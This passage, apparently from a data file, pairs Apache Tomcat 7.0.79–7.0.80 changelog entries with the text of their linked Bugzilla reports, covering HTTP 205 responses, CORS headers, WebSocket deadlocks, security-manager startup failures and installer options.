     keep-alive timeout, closes the connection and curl
     accepts it as a valid way to finish the response.

Proposed (naive) patch:

I have located the cause for this behavior, in class
org.apache.coyote.http11.Http11Processor
in line 1144.
Status 205 is treated the same way as 204 and 304,
that is to say no body as mandated by RFC,
but also no content length information.

The naive patch attached just removes 205 from those,
which solves the issue with the problematic clients.
However it makes it possible to add a body to a
205 response, and it becomes the webapp's author's
responsibility to not do that.

Another, possibly better, approach, could be to
have a special case for 205 only, where it
would ignore any attempt to put a content,
but it would add the header Content-Length: 0."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61086
Coyote|Tomcat 7.0.80 (violetagg)|fix|61322|Correct two regressions caused by the fix for 60319 when using BIO with an external Executor. Firstly, use the maxThreads setting from the Executor as the default for maxConnections if none is specified. Secondly, use maxThreads from the Executor when calculating the point at which to disable keep-alive. (markt)|Http11Processor.disableKeepAlivePercentage not work after code change in 60319|"After code change in 60319, connector attributes will be reported as -1 when an Executor is in use.

But in Http11Processor.disableKeepAlive(), we still use endpoint.getMaxThreads() to get max threads allowed, and when use a Executor, this returns -1, and disableKeepAlive() always return false in this case.

This issue exist from 7.0.73 to 7.0.79.


Thanks."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61322
Coyote|Tomcat 7.0.80 (violetagg)|add||Add additional logging to record problems that occur while waiting for the NIO pollers to stop during the Connector stop process. (markt)|||
Coyote|Tomcat 7.0.80 (violetagg)|fix||Prevent exceptions being thrown during normal shutdown of NIO connections. This enables TLS connections to close cleanly. (markt)|||
Jasper|Tomcat 7.0.80 (violetagg)|add|53031|Add support for the fork option when compiling JSPs with the Jasper Ant task and javac. (markt)|Ant Jasper task should support Fork option|"As discussed in the ""Ant Tasks Question"" thread posted to the users list (http://mail-archives.apache.org/mod_mbox/tomcat-users/201203.mbox/%3C00c82ddd5a8b1fb9cb75b0c98b39598d%40mail.gmail.com%3E), JspC has a getFork() method that unconditionally returns false. The JspC Ant task does not support forking like other Ant tasks, such as java, javac, etc.

It is the opinion of at least myself and Chris Schultz that supporting forking should be expected of a nice player in the Ant ecosystem.

The Ant task for JSP compilation should be improved to support forking."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53031
WebSocket|Tomcat 7.0.80 (violetagg)|add|57767|Add support to the WebSocket client for following redirects when attempting to establish a WebSocket connection. Patch provided by J Fernandez. (markt)|Websocket client proprietary configuration|"The Websocket client does not provide the functionality usually found in HTTP clients. As a result, it cannot do anything except a straight upgrade from HTTP/1.1 to Websocket.

To handle more than this, it would need proprietary configuration to handle:
- Authentication
- Redirects

For reference about the possibilities:
https://tyrus.java.net/documentation/1.8/user-guide.html#tyrus-proprietary-config
Authentication: https://tyrus.java.net/documentation/1.8/user-guide.html#d0e1524
Redirects: https://tyrus.java.net/documentation/1.8/user-guide.html#d0e1640

This is not a critical enhancement however as users can use their own websocket client implementation, they don't have to rely on the one Tomcat provides."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57767
Other|Tomcat 7.0.80 (violetagg)|add|52791|Add the ability to set the defaults used by the Windows installer from a configuration file. Patch provided by Sandra Madden. (markt)|[PATCH] read windows installer default values from config file|"Created attachment 28399 [details]
patch for the tomcat install project file

Hi,

I attached a patch for the tomcat nsis installer that enables the installer to read it's default values from an ini file (config.ini) instead of using the in script defined onces. If the ini file does not exist, the script values are used. The same happens if the ini file exists, but a value is not defined. E.g. maybe you want to go with all of the script defined values but one or so. Please look at the attached diff. 

This is how a sample config.ini file would look like (filename must be config.ini and reside in $EXEDIR)

---------------
config.ini:
---------------

TomcatPortHttp=80
TomcatMenuEntriesEnable=1
TomcatShortcutAllUsers=1
TomcatAdminEnable=1

---------------


It would be great if this enhancement could be merged into the next installer :-)

Thanks!
Sandra"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52791
Catalina|Tomcat 7.0.79 (violetagg)|fix|61101|CORS filter should set Vary header in response. Submitted by Rick Riemer. (remm)|CorsFilter should add Vary header to response|"The Tomcat CorsFilter does not add a Vary header to the response to indicate that the response can vary for different values of the Origin header in the request. This poses problems for caches, as they can yield cached Tomcat responses where they shouldn't because they don't know that a different Origin value may yield a different response.

The filter should add the Origin value to the Vary header of the response.

Per the CORS standard (https://www.w3.org/TR/cors/#resource-implementation):
""Resources that wish to enable themselves to be shared with multiple Origins but do not respond uniformly with ""*"" must in practice generate the Access-Control-Allow-Origin header dynamically in response to every request they wish to allow. As a consequence, authors of such resources should send a Vary: Origin HTTP header or provide other appropriate control directives to prevent caching of such responses, which may be inaccurate if re-used across-origins.""

Found this on multiple versions of the Tomcat CorsFilter (7, 8.0 and 8.5). A quick code inspection shows that this isn't present in /trunk either.

Found with multiple Java versions, at least including Oracle JDK 8u131 64-bit on Windows 10 64-bit. Seems to be unrelated to the connectors (found on the HTTP NIO and BIO connectors)

To reproduce, enable the CorsFilter in Tomcat's web.xml, and send an HTTP request that includes both a Host and an Origin header, where the Origin should be different than the Host, and should be a value that is configured to be allowed by the CorsFilter. Inspect the response headers. A 'Vary: Origin' header should be in the response, but isn't."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61101
Catalina|Tomcat 7.0.79 (violetagg)|add|61105|Add a new JULI FileHandler configuration for specifying the maximum number of days to keep the log files. (violetagg)|Roll log files by default|From a discussion at TomcatCon, it would be a better default if Tomcat rolled log files by default to avoid filling disks. We probably need to err on the side of caution regarding how long to keep the files for.|https://bz.apache.org/bugzilla/show_bug.cgi?id=61105
Catalina|Tomcat 7.0.79 (violetagg)|fix||Improve the SSLValve so it is able to handle client certificate headers from Nginx. Based on a patch by Lucas Ventura Carro. (markt)|||
Catalina|Tomcat 7.0.79 (violetagg)|fix|61154|Allow the Manager and Host Manager web applications to start by default when running under a security manager. This was accomplished by adding a custom permission, org.apache.catalina.security.DeployXmlPermission, that permits an application to use a META-INF/context.xml file and then granting that permission to the Manager and Host Manager. (markt)|The manager applications don't start when using the Security Manager|"With a vanilla install the admin applications fail to deploy if you start using the Security Manager. To resolve the issue you can move the context.xml from the webapps into the conf/[Engine]/[Host] directory renaming them to match the webapp. Is there some reason we don't inherently trust the manager webapps? Is this behavior on purpose?

To reproduce:

1) Download, unzip, and start Tomcat

$ wget http://apache.mesi.com.ar/tomcat/tomcat-8/v8.5.15/bin/apache-tomcat-8.5.15.tar.gz
$ tar xvf apache-tomcat-8.5.15.tar.gz
$ pushd apache-tomcat-8.5.15
$ bin/catalina.sh start -security

2) Check the log for the following exception (stacks shortened for brevity and excludes host-manager exception):

~~~
04-Jun-2017 10:15:30.344 SEVERE [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory The web application with context path [/manager] was not deployed because it contained a deployment descriptor [/apache-tomcat-8.5.15/webapps/manager/META-INF/context.xml] which may include configuration necessary for the secure deployment of the application but processing of deployment descriptors is prevented by the deployXML setting of this host. An appropriate descriptor should be created at [/apache-tomcat-8.5.15/conf/Catalina/localhost/manager.xml] to deploy this application.
04-Jun-2017 10:15:30.376 SEVERE [localhost-startStop-1] org.apache.catalina.core.ContainerBase.addChildInternal ContainerBase.addChild: start: 
 org.apache.catalina.LifecycleException: Failed to start component [/manager]
    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:167)
    ....
Caused by: org.apache.catalina.LifecycleException: Failed to process either the global, per-host or context-specific context.xml file therefore the [/manager] Context cannot be started.
    at org.apache.catalina.startup.FailedContext.startInternal(FailedContext.java:199)
    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
    ... 14 more

04-Jun-2017 10:15:30.377 SEVERE [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Error deploying web application directory [/apache-tomcat-8.5.15/webapps/manager]
 java.lang.IllegalStateException: ContainerBase.addChild: start: org.apache.catalina.LifecycleException: Failed to start component [/manager]
    at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:756)
    ....
~~~"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61154
Catalina|Tomcat 7.0.79 (violetagg)|fix|61173|Polish the javadoc for o.a.catalina.startup.Tomcat. Patch provided by peterhansson_se. (violetagg)|Javadoc for Tomcat class is close to impossible to read - patch attached|"Created attachment 35043 [details]
Screenshot of what the Javadoc looks like

The Javadoc for the Tomcat class (used by those who embed Tomcat) is close to impossible to read. See attached PNG file."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61173
Catalina|Tomcat 7.0.79 (violetagg)|add||A new configuration property crawlerIps is added to the o.a.catalina.valves.CrawlerSessionManagerValve. Using this property one can specify a regular expression that will be used to identify crawlers based on their IP address. Based on a patch provided by Tetradeus. (violetagg)|||
Catalina|Tomcat 7.0.79 (violetagg)|fix|61180|Log a warning message rather than an information message if it takes more than 100ms to initialised a SecureRandom instance for a web application to use to generate session identifiers. Patch provided by Piotr Chlebda. (markt)|Change log level of sessionIdGeneratorBase.createRandom to warn rather than info|"I was just asked a question in #tomcat about why a user's tomcat installation was taking ~36 minutes to start. After looking at their logging I immediately noticed:

INFO [localhost-startStop-1] org.apache.catalina.util.SessionIdGeneratorBase.createSecureRandom Creation of SecureRandom instance for session ID generation using [SHA1PRNG] took [2,157,784] milliseconds.

showing that the machine had low entropy. I knew that from experience, however the user had no idea that was the issue because the logging looked normal to them (no WARN or ERROR messages). Can we change the log level of the sessionIdGeneratorBase.createRandom message to WARN rather than INFO so if it takes longer than 100 ms to generate a random users are made aware? A WARN message will at least make them look twice at the error line and google it as a potential issue, which should yield the wiki page (https://wiki.apache.org/tomcat/HowTo/FasterStartUp#Entropy_Source).

Also, the wording in the wiki page makes this sound like it should be a warning anyway:

""You will see warning in the logs when this happens"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=61180
Catalina|Tomcat 7.0.79 (violetagg)|fix|61185|When an asynchronous request is dispatched via AsyncContext.dispatch() ensure that getRequestURI() for the dispatched request matches that of the original request. (markt)|AsynContext.dispatch() does not use encoded URI|"From the Servlet spec says:

""If the AsyncContext was initialized via the startAsync(ServletRequest, ServletResponse) and the request passed is an instance of HttpServletRequest , then the dispatch is to the URI returned by HttpServletRequest.getRequestURI()""

However AsyncContextImpl uses the servletPath:
https://github.com/apache/tomcat/blob/9af8708d7ea3817df47f34146a6ff802d96980fa/java/org/apache/catalina/core/AsyncContextImpl.java#L156-L163

So given a URL with an encoded slash (and UDecoder.ALLOW_ENCODED_SLASH=true):
/foo/vv%2F1234/add/2

The dispatch ends up going to:
/foo/vv/1234/add/2"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61185
Catalina|Tomcat 7.0.79 (violetagg)|fix|61201|Ensure that the SCRIPT_NAME environment variable for CGI executables is populated in a consistent way regardless of how the CGI servlet is mapped to a request. (markt)|CGIServlet adds too much to the SCRIPT_NAME environment variable if script followed by extra path|"I run the following bash script as CGI (test2.sh):

-----
#!/bin/bash

echo ""Content-Type: text/plain""
echo

set
-----

If I call it as

http://127.0.0.1:8086/nextcloud/test2.sh

it outputs

[...]
SCRIPT_NAME=/nextcloud/test2.sh
[...]

If I call it as

http://127.0.0.1:8086/nextcloud/test2.sh/login

it outputs

[...]
SCRIPT_NAME=/nextcloud/test2.sh/login/test2.sh
[...]


But the value of $SCRIPT_NAME should stay the same.

Excerpt from my web.xml:

   <servlet>
      <servlet-name>test-cgi</servlet-name>
      <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
      <init-param>
        <param-name>executable</param-name>
        <param-value>/bin/bash</param-value>
      </init-param>
      <init-param>
        <param-name>passShellEnvironment</param-name>
        <param-value>true</param-value>
      </init-param>
   </servlet>

   <servlet-mapping>
      <servlet-name>test-cgi</servlet-name>
      <url-pattern>*.sh</url-pattern>
    </servlet-mapping>

   <servlet-mapping>
      <servlet-name>test-cgi</servlet-name>
      <url-pattern>/test2.sh/login</url-pattern>
    </servlet-mapping>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61201
Catalina|Tomcat 7.0.79 (violetagg)|fix|61215|Correctly define addConnectorPort and invalidAuthenticationWhenDeny in the mbean-descriptors.xml file for the org.apache.catalina.valves package so that the attributes are accessible via JMX. (markt)|NoSuchMethodException in JMX Proxy when accessing to RemoteAddrValve MBeans|The RemoteAddrValve class has some new boolean attributes (addConnectorPort, invalidAuthenticationWhenDeny, addConnectorPort, invalidAuthenticationWhenDeny) but the accessors are not mbean-friendly. 'is' should be used instead of 'get'.|https://bz.apache.org/bugzilla/show_bug.cgi?id=61215
Coyote|Tomcat 7.0.79 (violetagg)|fix|61086|Explicitly signal an empty request body for HTTP 205 responses. (markt)|Some clients hang when HTTP responses give status 205 Reset Content|"Created attachment 34992 [details]
Exemple standalone servlet to give out HTTP 205 response

When a servlet running on Tomcat sends a response over HTTP with status 205 Reset Content, some clients hang with this response and just wait for it to ""complete"" after Tomcat considers it fully done.

So far I've identified two clients:
- command line program curl, version 7.52.1,
- Jersey client, version 1.19.1.

Using Tomcat 8.5.15 (latest release), but the issue was here for as long as I went back and it seems still here in Tomcat 9.

Debugging the HTTP communication shows it has to do with the fact that the response has no body (which is correct, as mandated by RFC for status 205), and no indication of content length to explicitly say that there is no body. That last part is incorrect behavior according to RFC 7231 section 6.3.6:

   "" Since the 205 status code implies that no additional content will be provided, a server MUST NOT generate a payload in a 205 response.  In other words, a server MUST do one of the following for a 205 response: a) indicate a zero-length body for the response by including a Content-Length header field with a value of 0; b) indicate a zero-length payload for the response by including a Transfer-Encoding header field with a value of chunked and a message body consisting of a single chunk of zero-length; or, c) close the connection immediately after sending the blank line terminating the header section. ""

It seems the HTTP clients I've identified, do rely on this requirement stated by RFC. Testing with servers that do add a Content-Length: 0 header or a Transfer-encoding chunked with a zero-length chunk with a status 205, these clients behave as expected. Also note, that Tomcat will typically eventually reach its keep-alive timeout and close the connection. Which is actually a valid way to end the response, and these clients do accept it when they don't reach their own timeouts. It's just the response takes by default 20 seconds to be finished, and is done with closing a perfectly re-usable connection.

Steps to reproduce:

 (1) Have a clean Tomcat install version 8.5.15

 (2) Deploy on it a root webapp that responds to requests with
     HTTP status 205.

     You can use the standalone servlet class I put in attachment.
     As can be seen, it responds to all requests with status 205,
     and it adds a custom header just to be sure the response comes
     from this servlet.

 (3) Make an HTTP request to it with curl.

     Response looks like:

$ curl -v http://localhost:8080
* STATE: INIT => CONNECT handle 0x6000578f0; line 1413 (connection #-5000)
* Rebuilt URL to: http://localhost:8080/
* Added connection 0. The cache now contains 1 members
*   Trying 127.0.0.1...
* TCP_NODELAY set
* STATE: CONNECT => WAITCONNECT handle 0x6000578f0; line 1466 (connection #0)
* Connected to localhost (127.0.0.1) port 8080 (#0)
* STATE: WAITCONNECT => SENDPROTOCONNECT handle 0x6000578f0; line 1583 (connection #0)
* Marked for [keep alive]: HTTP default
* STATE: SENDPROTOCONNECT => DO handle 0x6000578f0; line 1601 (connection #0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.52.1
> Accept: */*
>
* STATE: DO => DO_DONE handle 0x6000578f0; line 1680 (connection #0)
* STATE: DO_DONE => WAITPERFORM handle 0x6000578f0; line 1807 (connection #0)
* STATE: WAITPERFORM => PERFORM handle 0x6000578f0; line 1817 (connection #0)
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 205
< x-mmar-servletname: return205
< Date: Thu, 11 May 2017 15:43:26 GMT
* no chunk, no close, no size. Assume close to signal end
* Marked for [closure]: HTTP: No end-of-message indicator
<
* STATE: PERFORM => DONE handle 0x6000578f0; line 1981 (connection #0)
* multi_done
* Curl_http_done: called premature == 0
* Closing connection 0
* The cache now contains 0 members

     curl hangs for a while after ""Marked for [closure]: HTTP: No end-of-message indicator"".
     Then after 20 seconds Tomcat reaches connection
     keep-alive timeout, closes the connection and curl
     accepts it as a valid way to finish the response.

Proposed (naive) patch:

I have located the cause for this behavior, in class
org.apache.coyote.http11.Http11Processor
in line 1144.
Status 205 is treated the same way as 204 and 304,
that is to say no body as mandated by RFC,
but also no content length information.

The naive patch attached just removes 205 from those,
which solves the issue with the problematic clients.
However it makes it possible to add a body to a
205 response, and it becomes the webapp's author's
responsibility to not do that.

Another, possibly better, approach, could be to
have a special case for 205 only, where it
would ignore any attempt to put a content,
but it would add the header Content-Length: 0."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61086
Coyote|Tomcat 7.0.79 (violetagg)|fix||Revert a change introduced in the fix for bug 60718 that changed the status code recorded in the access log when the client dropped the connection from 200 to 500. (markt)|requestDestroyed not called for asynchronous after I/O error|"Sequence of events:
1. Servlet ""synchronously"" writes an async response: ac = req.startAsync(); try { resp.getOutputStream().write(new byte[1024*1024]); } finally { ac.complete(); }
2. Client disconnects to force broken pipe (etc.): uc = new URL(""..."").openConnection(); uc.getInputStream().close(); uc.disconnect();

In this case, where ServletRequestListener.requestInitialized is called.  Summary of scenarios:
- Fail: the servlet writes the response synchronously after startAsync (described above)
- Fail: In Tomcat 8.5.11, the servlet writes the response truly asynchronously (with a new Thread)
- Pass: in Tomcat 8.5.6, the servlet writes the response truly asynchronously (with a new Thread)
- Pass: the servlet writes the response truly synchronously (without startAsync)
- Pass: the client reads the stream without disconnecting early (all Tomcat versions, regardless of other scenarios presented).

I think requestDestroyed should always be called."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60718
Coyote|Tomcat 7.0.79 (violetagg)|fix||Make asynchronous error handling more robust. In particular ensure that onError() is called for any registered AsyncListeners after an I/O error on a non-container thread. (markt)|||
Jasper|Tomcat 7.0.79 (violetagg)|fix|44787|Improve error message when JSP compiler configuration options are not valid. (markt)|"provide more error context on ""java.lang.IllegalStateException: No Java compiler available"""|"when manually attempting to pre-compile jsp pages, I get on debian etch 

  [jasper2] java.lang.IllegalStateException: No Java compiler available
  [jasper2]     at org.apache.jasper.JspCompilationContext.createCompiler(JspCompilationContext.java:224)
  [jasper2]     at org.apache.jasper.JspC.processFile(JspC.java:979)
  [jasper2]     at org.apache.jasper.JspC.execute(JspC.java:1135)

There appear to be 2 method variants to do this:

a) Compiler createCompiler(String className) doesn't bother to say which 
""className"" it was looking for in case of a failure
b) nor does it volunteer to cite the classpath it was looking for the org.apache.jasper.compiler.JDTCompiler or org.apache.jasper.compiler.AntCompiler (or the one specified in the ""options"" in the future)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=44787
WebSocket|Tomcat 7.0.79 (violetagg)|fix||Correct the log message when a MessageHandler for PongMessage does not implement MessageHandler.Whole. (rjung)|||
WebSocket|Tomcat 7.0.79 (violetagg)|fix||Improve thread-safety of Futures used to report the result of sending WebSocket messages. (markt)|||
WebSocket|Tomcat 7.0.79 (violetagg)|fix|61183|Correct a regression in the previous fix for 58624 that could trigger a deadlock depending on the locking strategy employed by the client code. (markt)|Deadlock occurs while sending to a closing session|"Hi,
We have recently ran into a deadlock situation in a customer site while using websockets.
One of the locks is in our code while the other is the Tomcat ""stateLock"" defined in ""class WsSession"".

I have marked this issue as a regression because one of the 2 locations that Tomcat takes the stateLock in 8.0.33 did not exist in 8.0.29. Here's a quick look at the differences before examining the deadlocked call stacks:

In 8.0.33 there's an expansion of the stateLock usage:
    protected void registerFuture(FutureToSendHandler f2sh) {
        boolean fail = false;
        synchronized (stateLock) {
			// leaving out the details...
		}
	}
		
While in 8.0.29 the entire method looks like:
    protected void registerFuture(FutureToSendHandler f2sh) {
        futures.put(f2sh, f2sh);
    }

I can understand why the stateLock usage has been expanded. But I think there is a problem with this. Previously we'd only enter stateLock in Tomcat -> Application calls. Now with the new registerFuture we also can enter stateLock in Application -> Tomcat calls.
So a recent change seems to have introduced a key ingredient for deadlocks. If my application has its own lock there is the potential for 2 locks to be acquired in reverse order by 2 simultaneous threads. 

We have experienced a real-world example of this:

In the 1st thread Tomcat is closing the session after an abrupt disconnect from the client. The close action bubbles up to the Application onClose handler:

""http-nio-8445-exec-76"" daemon prio=5 tid=249 BLOCKED
                at com.myc.common.domain.websocketutil.WsOutbound.setSocketStatus(WsOutbound.java:152) --> Waits on the Application local lock
                   Local Variable: com.myc.common.domain.websocketutil.WsOutbound$SocketStatus#2
                at com.myc.customer.web.socket.WebSocketEndpoint.onClose(WebSocketEndpoint.java:224)  --> Application onClose handler called which has to do some tidy up
                   Local Variable: javax.websocket.CloseReason#2
                   Local Variable: com.myc.customer.web.socket.WebSocketEndpoint#4
                   Local Variable: java.lang.Object#9184
                at sun.reflect.GeneratedMethodAccessor250.invoke(<unknown string>)
                at sun.reflect.DelegatingMethodAccessorImpl.invoke(<unknown string>)
                at java.lang.reflect.Method.invoke(<unknown string>)
                at org.apache.tomcat.websocket.pojo.PojoEndpointBase.onClose(PojoEndpointBase.java:107)
                   Local Variable: org.apache.tomcat.websocket.pojo.PojoEndpointServer#6
                at org.apache.tomcat.websocket.WsSession.fireEndpointOnClose(WsSession.java:541)
                   Local Variable: org.apache.catalina.loader.WebappClassLoader#2
                   Local Variable: org.apache.catalina.core.DefaultInstanceManager#3
                at org.apache.tomcat.websocket.WsSession.doClose(WsSession.java:490)        		--> Acquires a ‚Äústate lock‚Äù on Tomcats call to close the session
                at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.onError(WsHttpUpgradeHandler.java:150)
                   Local Variable: org.apache.tomcat.websocket.server.WsHttpUpgradeHandler#6
                at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.access$300(WsHttpUpgradeHandler.java:48)

				
In the 2nd thread the Application is simply sending a normal message to Tomcat (unaware the session is closing simultaneously):

""defaultEventExecutorGroup-3-1"" prio=5 tid=94 BLOCKED
                at org.apache.tomcat.websocket.WsSession.registerFuture(WsSession.java:650)           --> Waits on the Tomcat ‚ÄústateLock‚Äù
                   Local Variable: org.apache.tomcat.websocket.WsSession#6
                at org.apache.tomcat.websocket.FutureToSendHandler.get(FutureToSendHandler.java:104)
                   Local Variable: org.apache.tomcat.websocket.FutureToSendHandler#247
                   Local Variable: java.util.concurrent.TimeUnit$4#1
                at org.apache.tomcat.websocket.FutureToSendHandler.get(FutureToSendHandler.java:31)
                at com.myc.common.domain.websocketutil.WsOutbound.await(WsOutbound.java:255)
                at com.myc.common.domain.websocketutil.WsOutbound.sendObj(WsOutbound.java:234)
                at com.myc.common.domain.websocketutil.WsOutbound.send(WsOutbound.java:215)         --> Acquires the Application local lock while sending (to guarantee message order when sending multiple messages)
                   Local Variable: com.myc.customer.model.json.notification.NewMessageNotification#3

Our interface to Tomcat (wsOutbound.java) takes the Application lock using class ""synchronized"" as follows:

    public synchronized void setSocketStatus(SocketStatus status) {
		// Does some state change stuff. Can be invoked from onClose()
	}
	
	public synchronized boolean send(Object obj) {
		// Sends one or more messages to Tomcat
	}
	
So we had a simple locking strategy. Now I have to come up with a message queuing strategy so that I can send multiple messages, in order, without holding an Application lock.

To my mind the root problem is in the existing Tomcat code for doClose(). In other deadlock situations I've been involved with the onus has been on the thread that invokes a callback/listener to exit any locks it holds first:

    private void doClose(CloseReason closeReasonMessage,
            CloseReason closeReasonLocal) {
        // Double-checked locking. OK because state is volatile
        if (state != State.OPEN) {
            return;
        }

        synchronized (stateLock) {
            if (state != State.OPEN) {
                return;
            }

            if (log.isDebugEnabled()) {
                log.debug(sm.getString(""wsSession.doClose"", id));
            }
            try {
                wsRemoteEndpoint.setBatchingAllowed(false);
            } catch (IOException e) {
                log.warn(sm.getString(""wsSession.flushFailOnClose""), e);
											<-- Exit stateLock first?
                fireEndpointOnError(e);
            }

            state = State.CLOSING;

            sendCloseMessage(closeReasonMessage);
											<-- Exit stateLock first?
            fireEndpointOnClose(closeReasonLocal);
											<-- Reenter stateLock?
            state = State.CLOSED;
        }
		
I took a quick look at the latest 8.0.x (8.0.44) code and it appears the same issue can happen.
I'd appreciate any comment on my analysis or improvements in coding our application."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61183
Web applications|Tomcat 7.0.79 (violetagg)|fix||Better document the meaning of the trimSpaces option for Jasper. (markt)|||
Web applications|Tomcat 7.0.79 (violetagg)|fix|61150|Configure the Manager and Host-Manager web applications to permit serialization and deserialization of CRSFPreventionFilter related session objects to avoid warning messages and/or stack traces on web application stop and/or start when running under a security manager. (markt)|One of the session attributes on the [host-]manager application is disallowed by the Security Manager|"To reproduce:

1) Configure tomcat user for testing (conf/tomcat-users.xml):

    <user username=""tomcat"" password=""tomcat"" roles=""admin-gui,manager-gui""/>

2) Start Tomcat

    bin/catalina.sh start

3) Create a session

    $ curl -is http://tomcat:tomcat@localhost:8080/manager/html | egrep '(HTTP|JSESSIONID)'
    HTTP/1.1 200 OK
    Set-Cookie: JSESSIONID=DAF81E606AED325CB2E5C2773DB866CE; Path=/manager; HttpOnly

4) Stop Tomcat so that the session are serialized

    bin/catalina.sh stop

5) Start Tomcat with Security Manager to deserialize the sessions

    bin/catalina.sh start -security

6) Check log for exception after startup:

02-Jun-2017 14:16:46.114 SEVERE [localhost-startStop-1] org.apache.catalina.session.StandardManager.startInternal Exception loading sessions from persistent storage
 java.io.InvalidClassException: The class [org.apache.catalina.filters.CsrfPreventionFilter$LruCache] did not match the regular expression [java\.lang\.(?:Boolean|Integer|Long|Number|String)] for classes allowed to be deserialized
    at org.apache.catalina.util.CustomObjectInputStream.resolveClass(CustomObjectInputStream.java:146)
    at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1612)
    at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1517)
    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1771)
    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)
    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)
    at org.apache.catalina.session.StandardSession.doReadObject(StandardSession.java:1624)
    at org.apache.catalina.session.StandardSession.readObjectData(StandardSession.java:1090)
    at org.apache.catalina.session.StandardManager.doLoad(StandardManager.java:218)
    at org.apache.catalina.session.StandardManager$PrivilegedDoLoad.run(StandardManager.java:74)
    at org.apache.catalina.session.StandardManager$PrivilegedDoLoad.run(StandardManager.java:65)
    at java.security.AccessController.doPrivileged(Native Method)
    at org.apache.catalina.session.StandardManager.load(StandardManager.java:149)
    at org.apache.catalina.session.StandardManager.startInternal(StandardManager.java:356)
    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
    at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5331)
    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
    at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:753)
    at org.apache.catalina.core.ContainerBase.access$000(ContainerBase.java:131)
    at org.apache.catalina.core.ContainerBase$PrivilegedAddChild.run(ContainerBase.java:153)
    at org.apache.catalina.core.ContainerBase$PrivilegedAddChild.run(ContainerBase.java:143)
    at java.security.AccessController.doPrivileged(Native Method)
    at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:727)
    at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:717)
    at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:587)
    at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1798)
    at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
    at java.util.concurrent.FutureTask.run(FutureTask.java:262)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61150
Tribes|Tomcat 7.0.79 (violetagg)|add||Add JMX support for Tribes components. (kfujino)|||
Other|Tomcat 7.0.79 (violetagg)|add|45832|Add HTTP DIGEST authentication support to the Catalina Ant tasks used to communicate with the Manager application. (markt)|add DIGEST authentication support to Ant tasks|"It would be useful if the Catalina Ant tasks supported HTTP Digest authentication, in addition to Basic authentication. This is convenient if one already has a digest-based security realm and doesn't want to maintain an extra  tomcat-users.xml file. (And Basic authentication is terribly insecure.)

Currently the AbstractCatalinaTask [1] just performs Basic authentication:

  // Set up an authorization header with our credentials
  String input = username + "":"" + password;
  String output = new String(Base64.encode(input.getBytes()));
  hconn.setRequestProperty(""Authorization"",
                           ""Basic "" + output);

[1] http://svn.apache.org/repos/asf/tomcat/tc6.0.x/trunk/java/org/apache/catalina/ant/AbstractCatalinaTask.java"|https://bz.apache.org/bugzilla/show_bug.cgi?id=45832
Other|Tomcat 7.0.79 (violetagg)|fix|45879|Add the RELEASE-NOTES file to the root of the installation created by the Tomcat installer for Windows to make it easier for users to identify the installed Tomcat version. (markt)|Windows installer fails to install NOTICE and RELEASE-NOTES|The Windows service installer fails to install the NOTICE and RELEASE-NOTES files in the target directory.|https://bz.apache.org/bugzilla/show_bug.cgi?id=45879
Other|Tomcat 7.0.79 (violetagg)|fix|61076|Document the altDDName attribute for the Context element. (markt)|Context attribute altDDName not Documented|"I was looking for functionality that would allow me to deploy one physical directory with two different deployment descriptors. The apps essentially use the same code base, but expose different pages, URLs and resources. After looking through the source code, I found the altDDName attribute defined in j.o.a.c.startup.ContextConfig. This does exactly what I need. I added the attribute to my context.xml, and my application deployed as expected. Here's what I would propose for documentation for config/context.html#Attributes:

altDDName 
The absolute path (or URL) to the deployment descriptor for this context. This overrides the default deployment descriptor name /WEB-INF/web.xml. Specifying the alternate deployment descriptor name allows you to deploy more than one application from one path."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61076
Other|Tomcat 7.0.79 (violetagg)|fix|61145|Add missing @Documented annotation to annotations in the annotations API. Patch provided by Katya Todorova. (markt)|Missing @Documented annotation in some javax.annotation classes|"Created attachment 35026 [details]
Patch validated against tomcat tests and the corresponding specification

According to 
https://docs.oracle.com/javaee/7/api/javax/annotation/package-summary.html and 
https://docs.oracle.com/javaee/7/api/javax/annotation/security/package-summary.html

the following classes should have @Documented annotation:

javax.annotation.Generated
javax.annotation.PostConstruct
